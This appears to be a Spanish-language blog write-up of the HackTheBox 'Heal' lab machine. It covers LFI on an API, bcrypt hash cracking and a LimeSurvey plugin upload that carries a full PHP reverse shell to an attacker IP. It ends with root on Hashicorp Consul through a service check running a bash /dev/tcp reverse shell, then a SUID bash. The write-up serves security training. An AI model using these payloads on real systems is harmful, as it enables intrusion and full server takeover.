---
layout: post
title:  "Writeup Heal"
date:   2025-05-17 
categories: [Writeup, HackTheBox]
tags: linux
image: /images/writeup-heal/Pasted image 20250510203459.png
---


***Dificultad: Media***

***Sistema Operativo: Linux***

---------------------------------------------------------
\
hola! vamos a P0wn3ar esta Heal, se trata de una aplicacion web la cual tiene 2 subdominios, en el cual uno de ellos hay una mala configuración que puede ser aprovechada para explotar la vulnerabilidad *LFI*, lo que nos hará encontrar archivos de configuracion importantes en el servidor y datos mal almacenados que seran usados para iniciar en un panel administrativo y explotar la subida de Pluggins maliciosos en *limesurvey* pudiendo ganar una reverse shell en el sistema objetivo.
En la escalada de privilegios tenemos algo similar, llegando a una aplicación de la red interna mediante *ssh-portfordwarding* e inyectando un servicio malicioso en la misma.

-------------------------------
\
Primero vamos a crear los directorios de trabajo:
```bash
mkdir nmap content exploits && cd nmap
```
## Reconocimiento:
hacemos el primer escaneo con nmap para descubrir puertos abiertos:
```bash
nmap -p- --open -sS -Pn -vvv -n --min-rate 5000  10.129.231.237 -oN puertos
```

tenemos:
```
Scanned at 2025-05-11 09:25:46 CEST for 11s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
```
2 puertos clásicos 80http 22ssh

vamos a tomar estos puertos y veamos que servicios están expuesto:
```bash
nmap -p22,80 -sCV -n -vvv 10.129.231.237 -oN objetivos
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
tenemos un hostname, voy a agregarlos a mi /etc/hosts

```
10.10.10.10              heal.htb
```

en busca de subdominios he escaneado con ffuf y gobuster pero sin resultados exitoso

tambien intentando escanear con feroxbuster subdirectorios, cada petición arroja 503

al hacer un whatweb veo:
```
http://heal.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.231.237], Script, Title[Heal], X-Powered-By[Express], nginx[1.18.0]
```

voy a ir a la web
<img src='/images/writeup-heal/Pasted image 20250511095431.png' alt="image">

es una web para construir currículos y tenemos un panel de inicio de sessión y de registro

no me permite crear una cuenta

mirando la solicitud en el burpsuite tenemos:

<img src='/images/writeup-heal/Pasted image 20250511100436.png' alt="image">

otro subdominio y es una api voy a agregarlo a mi /etc/hosts y veremos que encontramos

```bash
10.10.10.10         heal.htb     api.heal.htb
```

despues de agregarla a mis hosts, ha podido reconocer la llamada y registrar la cuenta:
<img src='/images/writeup-heal/Pasted image 20250511101628.png' alt="image">

hemos ingresado a un panel para elaborar un resumen laboral

enumerando la web, hay un apartado que dice **take a survey** :
<img src='/images/writeup-heal/Pasted image 20250511101804.png' alt="image">

si clicamos, vemos que tenemos otro subdominio:
<img src='/images/writeup-heal/Pasted image 20250511101834.png' alt="image">

take-survey.heal.htb

## Enumeracion:

pero vamos por parte, ya vamos a trabajar con el, primero podemos agregarlo a nuestros hosts y seguir enumerando la pagina (ya tenemos 3 subdominios)
```bash
10.10.10.10   heal.htb api.heal.htb take-survey.heal.htb
```

voy a probar este generador en la pagina principal
mirando la solicitud de burpsuite todo son solicitudes a la api, asi que al interceptarlo no veo nada, pero mirando el historial http registrado por burp:
<img src='/images/writeup-heal/Pasted image 20250511103648.png' alt="image">

cuando vemos esto, siempre debemos probar si hay inclusión de archivos del servidor

pero estaba bastante ofuscado todo por asi decirlo, me parecia raro que la solicitud de descarga "get" fuera dificil de interceptar, asi que capturando los paquetes antes de que viajaran, lo logre, capture la solicitud get del archivo hacia la api, la modifique y:
<img src='/images/writeup-heal/Pasted image 20250511111220.png' alt="image">

no se podría hacer desde options dado el token, además no se podía cambiar el método porque daba un error

mientras probaba esto, descubrí 2 cosas interesantes

1) la api es ruby rails version 7.1.4 *desactualizada*
2) take-survey es un software libre llamado LimeSurvey

<img src='/images/writeup-heal/Pasted image 20250511111643.png' alt="image">

ruby rails versión antigua y desactualizada

<img src='/images/writeup-heal/Pasted image 20250511111726.png' alt="image">
limesurvey, el cual expone el nombre de usuario de un administrador **Ralph@heal.htp**

antes de profundizar mas en estos softwares, quiero intentar enumerar el sistema desde el file inclusión, intentar mirar archivos de configuración

en el /etc/passwd podemos ver los siguientes usuarios:
```
ron
postgres (base de datos postgressql)
ralph
root
```

*desde aquí no hay acceso a la flag de usuario*

## Explotacion de LFI:

buscare archivos de configuración

intentando varias, vi que el directorio de rails no funcionaba porque el nombre no era correcto asi que fui probando y :
<img src='/images/writeup-heal/Pasted image 20250511113111.png' alt="image">
```
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
```

tenemos otra ruta donde se almacena la base de datos en que esta en producción :D sigamos tirando de este hilo

para ambas bases de datos, la ruta es igual:

<img src='/images/writeup-heal/Pasted image 20250511114805.png' alt="image">

la base de datos, dado que no es tan grande en la misma respuesta podemos alcanzar a sacar datos:

```
ralph@heal : $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
test@heal : $2a$12$eXeY49S9LZnIaxnEfeN.6ecOg25vI/zRr/ot27AQvOC8.hR9emvYe
```

pasándolos por hashes.com para ver el tipo de hash, nos dice:
<img src='/images/writeup-heal/Pasted image 20250511121127.png' alt="image">

vamos con hashcat
```bash
hashcat hash /usr/share/wordlists/rockyou.txt -m 3200
```
```
ralph@heal.htb : $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG : 147258369
test@heal.htb : $2a$12$eXeY49S9LZnIaxnEfeN.6ecOg25vI/zRr/ot27AQvOC8.hR9emvYe : sin resultados
```

para descartar he probado ssh, pero sin resultados

vamos a los logins

en el principal:

<img src='/images/writeup-heal/Pasted image 20250511122226.png' alt="image">


en este punto, empezare a buscar sobre los otros subdominios, para ver como podemos aprovechar y que ventajas tendría

mirando un poco la documentación de la herramienta, si ponemos admin en la url, nos va a dirigir al panel de inicio de sesión administrativo:
<img src='/images/writeup-heal/Pasted image 20250511122713.png' alt="image">

http://take-survey.heal.htb/index.php/admin/authentication/sa/login

oh! y tambien funcionan aquí las credenciales encontradas:
<img src='/images/writeup-heal/Pasted image 20250511122829.png' alt="image">

tenemos una advertencia de seguridad:

<img src='/images/writeup-heal/Pasted image 20250511122933.png' alt="image">

## Shell como www-data:

tambien es segunda vez que vemos esa fecha, la cual es bastante desactualizada, investigando vulnerabilidades hay una para la ejecución remota de comandos reportada para la versión 5.2.4 pero buscando la version de este,  y vulnerabilidades especificas para esta versión (que la versión de este la encontramos en:http://take-survey.heal.htb/index.php/admin/globalsettings/sa/surveysettings ) tenemos:

<https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE>

al parecer es una carga maliciosa de un archivo zip, normalmente este tipo de vulnerabilidades se da en la carga de temas o plantillas y tenemos en la pagina una opción de carga de plugins:

<img src='/images/writeup-heal/Pasted image 20250511124125.png' alt="image">

necesitamos 2 archivos:

config.xml:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>3vilsec</name>
        <type>plugin</type>
        <creationDate>2025-01-13</creationDate>
        <lastUpdate>2025-01-13</lastUpdate>
        <author>3vilsec</author>
        <authorUrl>https://github.com/N4s1rl1</authorUrl>
        <supportUrl>https://github.com/N4s1rl1</supportUrl>
        <version>6.6.4</version>
        <license>GNU General Public License version 3 or later</license>
        <description>
		<![CDATA[Author : 3vilsec :D ]]></description>
    </metadata>

    <compatibility>
        <version>6.0</version>
        <version>5.0</version>
        <version>4.0</version>
        <version>3.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

una reverse shell el php (puede ser de pentestmokey o de revshells.com):
```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10';
$port = 443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

vamos a empaquetar ambos archivos en un comprimido zip:
```bash
zip 3vil.zip 3vil.php config.php
```

nos pondremos en encacha con nc:
```bash
nc -lnvp 443
```


primero se carga el zip:

<img src='/images/writeup-heal/Pasted image 20250511131113.png' alt="image">

claro que confiamos plenamente en este archivo :P

vamos a proceder a instalar:

<img src='/images/writeup-heal/Pasted image 20250511131209.png' alt="image">

y activarlo:
<img src='/images/writeup-heal/Pasted image 20250511131241.png' alt="image">

una vez activado vamos a visitar:


***http://take-survey.heal.htb/upload/plugins/3vilsec/3vil.php***

y tenemos nuestra revshell:

<img src='/images/writeup-heal/Pasted image 20250511131332.png' alt="image">

mirando los archivos de configuración de la pagina limesurvey en la ruta /var/www/limesurvey/application/config/ (dado que es una ruta típica) 

el archivo config.php:
```php
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),

                 'session' => array (
                        'sess$ ionName'=>'LS-ZNIDJBOXUNKXWTIP',
```

## ssh como ron:
*user.txt*

siempre que encontramos credenciales, hay que probarlas contra los usuarios del sistema o contra algún panel
en el directorio home solo vemos a ralph y ron, y si probamos las creds:

<img src='/images/writeup-heal/Pasted image 20250511134106.png' alt="image">

funcionan para el usuario ron muy bien y allí esta la flag, por lo que me hace suponer que tambien funcionara el ssh para este usuario

enumerando el sistema, hay muchos puertos abiertos en escucha:
<img src='/images/writeup-heal/Pasted image 20250511172853.png' alt="image">

buscando uno por uno, mirando cual tiene contenido, solo 2 de los no cumunes descargaron contenido al intentarme conectar con wget:
```
wget 127.0.0.1:8302
wget 127.0.0.1:8500
```

aunque el que mas contenido muestra es el 8500, para ver el contenido desde el navegador quiero hacerle un port forwarding con ssh:
```bash
ssh -L 6969:127.0.0.1:8500 ron@10.129.231.237
```
vamos a traer el puerto a nuestro puerto 6969 para poder verlo en la web

si vamos al navegador:
<img src='/images/writeup-heal/Pasted image 20250511173801.png' alt="image">
es un servicio llamado consul ui

vemos que ese programa en la maquina lo esta corriendo el usuario root:
<img src='/images/writeup-heal/Pasted image 20250511174225.png' alt="image">

que es hashicorp consul:

es una solución de red, que permite a los equipos gestionar la conectividad d red entre servicios ejecutables
<https://developer.hashicorp.com/consul/docs/intro>

es una interface para administrar servicios en la red de un servidor

## Shell como Root:
*root.txt*

si investigamos escaladas de privilegio o ejecuciones remostas de comando, tenemos:
<https://www.exploit-db.com/exploits/51117>

que nos muestra cmo se esta inyectando un servicio malicioso que devuelve una reverse shell a nuestro equipo, pero este exploit requiere algo llamado acl_token, si buscamos en la maquina con:
```bash
/usr/local/bin/consul acl token list
env |  grep CONSUL
```
o incluso vemos si hay variables de entorno con el token:
```bash
env
```

no vemos nada asi que, vamos a intentar registrar un servicio sin la clave a ver si la api esta expuesta en el servidor:
```bash
curl -X PUT -d '{"ID": "test", "Name": "test"}' http://127.0.0.1:8500/v1/agent/service/register
```

si actualizamos nuestro navegador:
<img src='/images/writeup-heal/Pasted image 20250511182712.png' alt="image">

podemos inyectar servicios

ahora, modificando el payload de exploitdb tenemos:
```bash
curl -X PUT -d '{
  "ID": "pwn",
  "Name": "pwn",
  "Address": "127.0.0.1",
  "Port": 9999,
  "check": {
    "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/4443 0>&1"],
    "interval": "10s"
  }
}' http://127.0.0.1:8500/v1/agent/service/register
```

dado que tenemos nc en esta misma maquina, nos podemos en escucha:
```bash
nc -lnvp 4443
```

y nos da la shell como pero se va:

<img src='/images/writeup-heal/Pasted image 20250511184403.png' alt="image">

así que como la conexión dura 1 min, simplemente cambie la bash a suid:

<img src='/images/writeup-heal/Pasted image 20250511184845.png' alt="image">

y ya pude convertirme en root con una shell mas estable:

<img src='/images/writeup-heal/Pasted image 20250511184943.png' alt="image">

ya en el directorio root, vemos los scripts que estaban complicando la maquina haha!

-------------------------
\
nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">